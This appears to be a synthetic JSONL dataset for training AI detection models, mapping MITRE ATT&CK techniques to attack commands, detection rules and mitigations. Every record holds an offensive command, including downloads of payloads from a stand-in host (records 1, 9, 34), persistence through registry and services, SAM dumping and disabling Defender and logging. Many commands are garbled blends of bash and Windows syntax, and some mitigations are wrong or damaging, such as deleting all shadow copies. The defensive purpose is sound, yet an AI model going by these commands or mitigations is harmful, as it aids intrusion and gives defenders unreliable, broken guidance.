{"id":1,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Executing malicious PowerShell script via encoded command to evade detection.","command":"powershell -EncodedCommand $(echo 'Invoke-Expression (New-Object Net.WebClient).DownloadString(\"http://malicious.com/payload.ps1\")' | base64)","detection":"Monitor PowerShell logs for '-EncodedCommand' with high-entropy strings; YARA rule: `rule EncodedPS { strings: $a = /powershell.*-EncodedCommand/ nocase; condition: $a }`","mitigation":"Restrict PowerShell execution policy: `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Restricted`; Enable PowerShell logging: `Set-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 1`","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect encoded PowerShell commands in logs and suggest execution policy restrictions."}
{"id":2,"tactic":"Persistence","technique":"T1053.005: Scheduled Task/Job","threat":"Creating persistent scheduled task using schtasks to run malicious script.","command":"schtasks /create /tn EvilTask /tr \"powershell -c 'I$(for($i=0;$i-lt100;$i++){$r+=([char](65+($i%26)))})$r'\" /sc daily /st 00:00","detection":"Audit scheduled tasks: `schtasks /query | findstr EvilTask`; Monitor for abnormal task names with high-entropy strings.","mitigation":"Restrict task creation: `icacls %windir%\\System32\\Tasks /inheritance:r`; Monitor Task Scheduler logs: Event ID 4698.","references":["MITRE ATT&CK T1053.005: https://attack.mitre.org/techniques/T1053/005/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect suspicious scheduled tasks and suggest access control restrictions."}
{"id":3,"tactic":"Privilege Escalation","technique":"T1078: Valid Accounts","threat":"Abusing net.exe to add user to local admin group, escalating privileges.","command":"net localgroup Administrators $(openssl rand -hex 8) /add","detection":"Monitor Security Event ID 4732 for group membership changes; Check for random usernames in net commands.","mitigation":"Enforce least privilege: `net localgroup Administrators /delete <user>`; Enable audit policy for account management.","references":["MITRE ATT&CK T1078: https://attack.mitre.org/techniques/T1078/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect unauthorized admin group changes and suggest least privilege enforcement."}
{"id":4,"tactic":"Defense Evasion","technique":"T1564.001: Hidden Files and Directories","threat":"Hiding malicious files using attrib to evade detection.","command":"attrib +h +s $(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 10).exe)","detection":"Search for hidden/system files: `dir /a:h /s`; Monitor file creation events: Event ID 4663.","mitigation":"Disable hidden attributes: `attrib -h -s *.* /s /d`; Enable file system auditing.","references":["MITRE ATT&CK T1564.001: https://attack.mitre.org/techniques/T1564/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect hidden file creation and suggest auditing configurations."}
{"id":5,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using cmd.exe to execute obfuscated commands for payload delivery.","command":"cmd /c \"set x=$(for /l %i in (1,1,100) do echo.)&call %x%&&powershell -c I$(echo 'malicious' | base64 -w0)\"","detection":"Monitor cmd.exe with unusual arguments: `wmic process where name='cmd.exe' get commandline`; YARA rule: `rule ObfuscatedCmd { strings: $a = /cmd.*call.*powershell/ nocase; condition: $a }`","mitigation":"Restrict cmd.exe execution: `AppLocker policy to deny cmd.exe for non-admins`; Enable command-line logging.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect obfuscated cmd.exe commands and suggest AppLocker restrictions."}
{"id":6,"tactic":"Persistence","technique":"T1547.001: Registry Run Keys","threat":"Adding malicious run key for persistence using reg add.","command":"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) /t REG_SZ /d \"powershell -w hidden -c 'I$(echo payload | base64 -w0)'\"","detection":"Monitor registry changes: `reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`; Event ID 4657.","mitigation":"Restrict registry writes: `regini -h deny HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`; Enable registry auditing.","references":["MITRE ATT&CK T1547.001: https://attack.mitre.org/techniques/T1547/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect unauthorized run key additions and suggest registry protections."}
{"id":7,"tactic":"Credential Access","technique":"T1003: OS Credential Dumping","threat":"Dumping credentials using wmic to query shadow copies.","command":"wmic shadowcopy call create Volume=$(shuf -n1 /etc/fstab | cut -f1)","detection":"Monitor wmic execution: `wmic process where name='wmic.exe' get commandline`; Event ID 4688.","mitigation":"Disable WMIC: `sc config winmgmt start= disabled`; Restrict shadow copy access: `vssadmin delete shadows /all /quiet`.","references":["MITRE ATT&CK T1003: https://attack.mitre.org/techniques/T1003/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect wmic-based credential dumping and suggest service restrictions."}
{"id":8,"tactic":"Defense Evasion","technique":"T1070.004: File Deletion","threat":"Deleting logs using wevtutil to evade detection.","command":"wevtutil cl System /q:\"Event[System[EventID=$(shuf -i 1000-9999 -n 1)]]\"","detection":"Monitor wevtutil execution: `wmic process where name='wevtutil.exe' get commandline`; Event ID 1102.","mitigation":"Restrict wevtutil: `icacls %windir%\\System32\\wevtutil.exe /deny Everyone:RX`; Enable audit log clearing: Event ID 1102.","references":["MITRE ATT&CK T1070.004: https://attack.mitre.org/techniques/T1070/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect log deletion attempts and suggest access controls."}
{"id":9,"tactic":"Execution","technique":"T1059.005: Visual Basic","threat":"Executing VBScript via wscript to download and run payload.","command":"wscript //B $(echo script$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).vbs) \"(New-Object Net.WebClient).DownloadFile('http://malicious.com/payload.exe', 'payload.exe'); Start-Process 'payload.exe'\"","detection":"Monitor wscript execution: `wmic process where name='wscript.exe' get commandline`; YARA rule: `rule VBScriptExec { strings: $a = /wscript.*DownloadFile/ nocase; condition: $a }`","mitigation":"Disable wscript: `reg add HKLM\\Software\\Microsoft\\Windows\\Script Host\\Settings /v Enabled /t REG_DWORD /d 0`; Restrict VBS execution: AppLocker.","references":["MITRE ATT&CK T1059.005: https://attack.mitre.org/techniques/T1059/005/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect VBScript execution and suggest script host restrictions."}
{"id":10,"tactic":"Persistence","technique":"T1543.003: Windows Service","threat":"Creating malicious service for persistence using sc create.","command":"sc create $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) binpath= \"cmd /c powershell -c 'I$(echo malicious | base64 -w0)'\"","detection":"Monitor service creation: `sc query | findstr <random_name>`; Event ID 7045.","mitigation":"Restrict service creation: `icacls %windir%\\System32\\sc.exe /deny Everyone:RX`; Audit service changes: Event ID 7045.","references":["MITRE ATT&CK T1543.003: https://attack.mitre.org/techniques/T1543/003/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect malicious service creation and suggest access controls."}
{"id":11,"tactic":"Privilege Escalation","technique":"T1055: Process Injection","threat":"Injecting malicious code into legitimate process using PowerShell.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; [Reflection.Assembly]::Load([Convert]::FromBase64String('payload')).GetType('Injector').GetMethod('Inject').Invoke($null, @($pid))\"","detection":"Monitor process injection: `sysmon -c process_access`; Event ID 10.","mitigation":"Enable process access auditing: `auditpol /set /category:\"Detailed Tracking\" /success:enable`; Use EDR to detect injection patterns.","references":["MITRE ATT&CK T1055: https://attack.mitre.org/techniques/T1055/","CWE-94: https://cwe.mitre.org/data/definitions/94.html"],"ai_training_prompt":"Train AI to detect process injection via PowerShell and suggest auditing."}
{"id":12,"tactic":"Defense Evasion","technique":"T1027: Obfuscated Files or Information","threat":"Using certutil to encode and execute obfuscated payload.","command":"certutil -encode $(echo payload.exe) $(echo temp$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt) && certutil -decode $(echo temp$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt) payload.exe && start payload.exe","detection":"Monitor certutil: `wmic process where name='certutil.exe' get commandline`; YARA rule: `rule CertutilObfuscation { strings: $a = /certutil.*-encode.*-decode/ nocase; condition: $a }`","mitigation":"Restrict certutil: `icacls %windir%\\System32\\certutil.exe /deny Everyone:RX`; Monitor file creation: Event ID 11.","references":["MITRE ATT&CK T1027: https://attack.mitre.org/techniques/T1027/","CWE-523: https://cwe.mitre.org/data/definitions/523.html"],"ai_training_prompt":"Train AI to detect certutil obfuscation and suggest access restrictions."}
{"id":13,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to execute WMI-based payload delivery.","command":"powershell -c \"$(for($i=0;$i-lt100;$i++){$r+=([char](65+($i%26)))})$r; Get-WmiObject Win32_Process -Filter 'name=\"notepad.exe\"' | ForEach-Object { $_.Terminate() }\"","detection":"Monitor WMI activity: `wmic process where name='powershell.exe' get commandline`; Event ID 5861.","mitigation":"Restrict WMI access: `netsh advfirewall firewall add rule name='Block WMI' dir=in action=block service=winmgmt`; Enable WMI logging.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect WMI-based PowerShell execution and suggest firewall rules."}
{"id":14,"tactic":"Persistence","technique":"T1574.002: DLL Side-Loading","threat":"Side-loading malicious DLL using rundll32.","command":"rundll32 $(echo legit$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll),EvilFunction","detection":"Monitor rundll32: `wmic process where name='rundll32.exe' get commandline`; Event ID 4688.","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Use signed DLLs only: AppLocker.","references":["MITRE ATT&CK T1574.002: https://attack.mitre.org/techniques/T1574/002/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect DLL side-loading and suggest AppLocker policies."}
{"id":15,"tactic":"Credential Access","technique":"T1555: Credentials from Password Stores","threat":"Extracting credentials from Windows Credential Manager using vaultcmd.","command":"vaultcmd /listcreds:\"Windows Credentials\" /all $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)","detection":"Monitor vaultcmd: `wmic process where name='vaultcmd.exe' get commandline`; Event ID 4688.","mitigation":"Restrict vaultcmd: `icacls %windir%\\System32\\vaultcmd.exe /deny Everyone:RX`; Enable credential guard: `DeviceGuard`.","references":["MITRE ATT&CK T1555: https://attack.mitre.org/techniques/T1555/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect vaultcmd credential extraction and suggest access controls."}
{"id":16,"tactic":"Defense Evasion","technique":"T1562.001: Impair Defenses","threat":"Disabling Windows Defender using PowerShell.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Set-MpPreference -DisableRealtimeMonitoring $true\"","detection":"Monitor Defender settings: `Get-MpPreference | Select-Object DisableRealtimeMonitoring`; Event ID 5001.","mitigation":"Restrict Defender modifications: `reg add HKLM\\Software\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 0`; Enable tamper protection.","references":["MITRE ATT&CK T1562.001: https://attack.mitre.org/techniques/T1562/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect Defender tampering and suggest tamper protection."}
{"id":17,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using forfiles to execute malicious payload indirectly.","command":"forfiles /p c:\\windows /s /m *.exe /c \"cmd /c powershell -c I$(echo payload | base64 -w0)\"","detection":"Monitor forfiles: `wmic process where name='forfiles.exe' get commandline`; YARA rule: `rule ForfilesExec { strings: $a = /forfiles.*powershell/ nocase; condition: $a }`","mitigation":"Restrict forfiles: `icacls %windir%\\System32\\forfiles.exe /deny Everyone:RX`; Monitor command execution: Event ID 4688.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect forfiles-based execution and suggest access controls."}
{"id":18,"tactic":"Persistence","technique":"T1546.008: Accessibility Features","threat":"Using sticky keys for persistence via sethc.exe replacement.","command":"copy /y $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) %windir%\\System32\\sethc.exe","detection":"Monitor sethc.exe changes: `dir %windir%\\System32\\sethc.exe /a`; Event ID 4657.","mitigation":"Restrict sethc.exe: `icacls %windir%\\System32\\sethc.exe /deny Everyone:WX`; Enable file integrity monitoring.","references":["MITRE ATT&CK T1546.008: https://attack.mitre.org/techniques/T1546/008/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect sethc.exe tampering and suggest file protections."}
{"id":19,"tactic":"Privilege Escalation","technique":"T1134: Access Token Manipulation","threat":"Manipulating access tokens using PowerShell to escalate privileges.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; [Security.Principal.WindowsIdentity]::GetCurrent().AccessToken | % { [Security.Principal.WindowsIdentity]::Impersonate($_) }\"","detection":"Monitor token manipulation: `sysmon -c token_access`; Event ID 4692.","mitigation":"Enable token auditing: `auditpol /set /category:\"System\" /subcategory:\"Security System Extension\" /success:enable`; Use EDR for token abuse detection.","references":["MITRE ATT&CK T1134: https://attack.mitre.org/techniques/T1134/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect token manipulation and suggest auditing."}
{"id":20,"tactic":"Defense Evasion","technique":"T1036: Masquerading","threat":"Masquerading malicious executable as legitimate system binary.","command":"copy $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) %windir%\\System32\\notepad.exe","detection":"Monitor file replacements: `dir %windir%\\System32\\notepad.exe /a`; Event ID 4657.","mitigation":"Enable file integrity: `sfc /scannow`; Restrict System32 writes: `icacls %windir%\\System32 /deny Everyone:WX`.","references":["MITRE ATT&CK T1036: https://attack.mitre.org/techniques/T1036/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect binary masquerading and suggest integrity checks."}
{"id":21,"tactic":"Execution","technique":"T1059.006: Python","threat":"Using Python to execute obfuscated payload via os.system.","command":"python -c \"import os; os.system('powershell -c I' + ''.join(chr(97 + (i % 26)) for i in range(50)) + '$(echo payload | base64 -w0)')\"","detection":"Monitor python execution: `wmic process where name='python.exe' get commandline`; YARA rule: `rule PythonExec { strings: $a = /python.*os.system.*powershell/ nocase; condition: $a }`","mitigation":"Restrict Python: `icacls %windir%\\System32\\python.exe /deny Everyone:RX`; Enable script execution logging.","references":["MITRE ATT&CK T1059.006: https://attack.mitre.org/techniques/T1059/006/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect Python-based payload execution and suggest access controls."}
{"id":22,"tactic":"Persistence","technique":"T1547.009: Shortcut Modification","threat":"Modifying Windows shortcut to execute malicious payload.","command":"copy %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\$(echo shortcut$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).lnk) /v TargetPath /t REG_SZ /d \"powershell -c 'I$(echo payload | base64 -w0)'\"","detection":"Monitor shortcut changes: `dir %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup /a`; Event ID 4657.","mitigation":"Restrict shortcut writes: `icacls %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup /deny Everyone:WX`; Enable file auditing.","references":["MITRE ATT&CK T1547.009: https://attack.mitre.org/techniques/T1547/009/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect shortcut modifications and suggest access controls."}
{"id":23,"tactic":"Credential Access","technique":"T1552.001: Credentials in Files","threat":"Extracting credentials from configuration files using findstr.","command":"findstr /s /i password $(echo config$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).ini)","detection":"Monitor findstr: `wmic process where name='findstr.exe' get commandline`; Event ID 4688.","mitigation":"Encrypt sensitive files: `cipher /e config.ini`; Restrict findstr: `icacls %windir%\\System32\\findstr.exe /deny Everyone:RX`.","references":["MITRE ATT&CK T1552.001: https://attack.mitre.org/techniques/T1552/001/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect credential extraction from files and suggest encryption."}
{"id":24,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 to execute malicious payload indirectly.","command":"rundll32 $(echo shell$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll),ExecutePayload","detection":"Monitor rundll32: `wmic process where name='rundll32.exe' get commandline`; Event ID 4688.","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Use AppLocker to block unsigned DLLs.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect rundll32 payload execution and suggest AppLocker policies."}
{"id":25,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to execute payload via Invoke-Command.","command":"powershell -c \"$(for($i=0;$i-lt100;$i++){$r+=([char](65+($i%26)))})$r; Invoke-Command -ScriptBlock { I$(echo payload | base64 -w0) }\"","detection":"Monitor PowerShell: `wmic process where name='powershell.exe' get commandline`; YARA rule: `rule InvokeCommand { strings: $a = /powershell.*Invoke-Command/ nocase; condition: $a }`","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Restricted`; Enable PowerShell logging.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect Invoke-Command executions and suggest execution policies."}
{"id":26,"tactic":"Persistence","technique":"T1053.002: At (Windows)","threat":"Using at command for persistence via scheduled execution.","command":"at $(date +%H:%M -d '+1 minute') cmd /c powershell -c 'I$(echo payload | base64 -w0)'","detection":"Monitor at commands: `at | findstr cmd`; Event ID 4698.","mitigation":"Disable at command: `sc config schedule start= disabled`; Restrict task scheduling: `icacls %windir%\\System32\\at.exe /deny Everyone:RX`.","references":["MITRE ATT&CK T1053.002: https://attack.mitre.org/techniques/T1053/002/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect at command scheduling and suggest service restrictions."}
{"id":27,"tactic":"Privilege Escalation","technique":"T1548.002: Bypass User Account Control","threat":"Bypassing UAC using ms-settings URI manipulation.","command":"cmd /c start ms-settings:windowsupdate $(echo powershell -c 'I$(echo payload | base64 -w0)')","detection":"Monitor ms-settings execution: `wmic process where name='cmd.exe' get commandline`; Event ID 4688.","mitigation":"Enable UAC: `reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1`; Restrict ms-settings: AppLocker.","references":["MITRE ATT&CK T1548.002: https://attack.mitre.org/techniques/T1548/002/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect UAC bypass attempts and suggest UAC enforcement."}
{"id":28,"tactic":"Defense Evasion","technique":"T1222.001: File and Directory Permissions Modification","threat":"Modifying file permissions to hide malicious files using cacls.","command":"cacls $(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /e /p Everyone:N","detection":"Monitor cacls: `wmic process where name='cacls.exe' get commandline`; Event ID 4663.","mitigation":"Restrict cacls: `icacls %windir%\\System32\\cacls.exe /deny Everyone:RX`; Enable file permission auditing.","references":["MITRE ATT&CK T1222.001: https://attack.mitre.org/techniques/T1222/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect file permission changes and suggest auditing."}
{"id":29,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using regsvr32 to execute malicious script indirectly.","command":"regsvr32 /s /u $(echo script$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sct) \"javascript:evil()\"","detection":"Monitor regsvr32: `wmic process where name='regsvr32.exe' get commandline`; YARA rule: `rule Regsvr32Exec { strings: $a = /regsvr32.*javascript/ nocase; condition: $a }`","mitigation":"Restrict regsvr32: `icacls %windir%\\System32\\regsvr32.exe /deny Everyone:RX`; Use AppLocker to block SCT files.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regsvr32 script execution and suggest AppLocker policies."}
{"id":30,"tactic":"Persistence","technique":"T1546.003: Windows Management Instrumentation Event Subscription","threat":"Creating WMI event subscription for persistence.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Register-WmiEvent -Query 'SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA \"Win32_Process\"' -Action { powershell -c 'I$(echo payload | base64 -w0)' }\"","detection":"Monitor WMI subscriptions: `Get-WmiObject -Namespace root\\subscription -Class __EventConsumer`; Event ID 5861.","mitigation":"Restrict WMI subscriptions: `netsh advfirewall firewall add rule name='Block WMI' dir=in action=block service=winmgmt`; Enable WMI auditing.","references":["MITRE ATT&CK T1546.003: https://attack.mitre.org/techniques/T1546/003/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect WMI event subscriptions and suggest firewall rules."}
{"id":31,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse msdt.exe for code execution via diagnostic scripts.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Start-Process msdt.exe -ArgumentList '/path $(echo diag$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).cab) /frombase64 $(echo 'malicious' | base64 -w0)'\"","detection":"Monitor msdt.exe execution: `wmic process where name='msdt.exe' get commandline`; YARA rule: `rule MsdtExec { strings: $a = /msdt.*frombase64/ nocase; condition: $a }`","mitigation":"Restrict msdt.exe: `icacls %windir%\\System32\\msdt.exe /deny Everyone:RX`; Disable diagnostic execution: `reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\ScriptedDiagnostics /v EnableDiagnostics /t REG_DWORD /d 0`","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect msdt.exe abuse in PowerShell logs and suggest diagnostic restrictions."}
{"id":32,"tactic":"Persistence","technique":"T1546.012: Image File Execution Options Injection","threat":"Injecting malicious debugger into IFEO for persistence via reg add.","command":"reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v Debugger /t REG_SZ /d \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)\"","detection":"Monitor IFEO changes: `reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\"`; Event ID 4657.","mitigation":"Restrict IFEO writes: `regini -h deny \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\"`; Enable registry auditing.","references":["MITRE ATT&CK T1546.012: https://attack.mitre.org/techniques/T1546/012/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect IFEO debugger injections and suggest registry protections."}
{"id":33,"tactic":"Privilege Escalation","technique":"T1548.003: Sudo and Sudo Caching","threat":"Abusing sudo caching on Linux to execute privileged commands.","command":"sudo -n $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh -c 'whoami > /root/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt'","detection":"Monitor sudo logs: `journalctl -u sudo`; Check for non-standard sudo commands.","mitigation":"Disable sudo caching: `echo 'Defaults timestamp_timeout=0' >> /etc/sudoers`; Restrict sudo access: `visudo`.","references":["MITRE ATT&CK T1548.003: https://attack.mitre.org/techniques/T1548/003/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect sudo caching abuse and suggest timeout configurations."}
{"id":34,"tactic":"Defense Evasion","technique":"T1218.010: Regsvr32","threat":"Using regsvr32 to execute obfuscated SCT file from remote server.","command":"regsvr32 /s /u /i:http://malicious.com/$(echo script$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sct) scrobj.dll","detection":"Monitor regsvr32 network activity: `netstat -anp | grep regsvr32`; YARA rule: `rule Regsvr32SCT { strings: $a = /regsvr32.*http.*sct/ nocase; condition: $a }`","mitigation":"Block regsvr32 network access: `netsh advfirewall firewall add rule name='Block regsvr32' dir=out program='%windir%\\System32\\regsvr32.exe' action=block`; Use AppLocker for SCT files.","references":["MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regsvr32 remote SCT execution and suggest firewall rules."}
{"id":35,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using pnputil.exe to load malicious driver for code execution.","command":"pnputil /add-driver $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf) /install","detection":"Monitor pnputil: `wmic process where name='pnputil.exe' get commandline`; Event ID 4688.","mitigation":"Restrict pnputil: `icacls %windir%\\System32\\pnputil.exe /deny Everyone:RX`; Require signed drivers: `bcdedit /set testsigning off`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect pnputil driver loading and suggest driver signing enforcement."}
{"id":36,"tactic":"Persistence","technique":"T1547.004: Winlogon Helper DLL","threat":"Injecting malicious DLL into Winlogon for persistence.","command":"reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"%windir%\\System32\\userinit.exe,$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)\"","detection":"Monitor Winlogon registry: `reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"`; Event ID 4657.","mitigation":"Restrict Winlogon writes: `regini -h deny \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"`; Enable DLL auditing.","references":["MITRE ATT&CK T1547.004: https://attack.mitre.org/techniques/T1547/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect Winlogon DLL injections and suggest registry protections."}
{"id":37,"tactic":"Credential Access","technique":"T1003.002: Security Account Manager","threat":"Dumping SAM database using reg save for credential access.","command":"reg save HKLM\\SAM $(echo sam$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).hiv)","detection":"Monitor reg save: `wmic process where name='reg.exe' get commandline | findstr SAM`; Event ID 4663.","mitigation":"Restrict SAM access: `regini -h deny HKLM\\SAM`; Enable LSA protection: `reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1`.","references":["MITRE ATT&CK T1003.002: https://attack.mitre.org/techniques/T1003/002/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect SAM database dumping and suggest LSA protections."}
{"id":38,"tactic":"Defense Evasion","technique":"T1562.002: Disable Windows Event Logging","threat":"Disabling event logging using auditpol to evade detection.","command":"auditpol /set /category:\"$(shuf -n1 <(auditpol /get /category:* | grep -oE '[A-Za-z ]+'))\" /success:disable /failure:disable","detection":"Monitor auditpol: `wmic process where name='auditpol.exe' get commandline`; Event ID 4719.","mitigation":"Restrict auditpol: `icacls %windir%\\System32\\auditpol.exe /deny Everyone:RX`; Enable audit policy backup: `secedit /export /cfg audit.bak`.","references":["MITRE ATT&CK T1562.002: https://attack.mitre.org/techniques/T1562/002/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect auditpol tampering and suggest audit policy protections."}
{"id":39,"tactic":"Execution","technique":"T1059.007: JavaScript","threat":"Executing JavaScript payload via wscript with obfuscated JScript.","command":"wscript //E:JScript $(echo script$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).js) \"eval(atob('$(echo 'malicious' | base64 -w0)'))\"","detection":"Monitor wscript JScript: `wmic process where name='wscript.exe' get commandline | findstr JScript`; YARA rule: `rule JScriptExec { strings: $a = /wscript.*eval.*atob/ nocase; condition: $a }`","mitigation":"Disable JScript: `reg add HKLM\\Software\\Microsoft\\Windows\\Script Host\\Settings /v JScript /t REG_DWORD /d 0`; Restrict wscript: AppLocker.","references":["MITRE ATT&CK T1059.007: https://attack.mitre.org/techniques/T1059/007/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect JScript execution and suggest script host restrictions."}
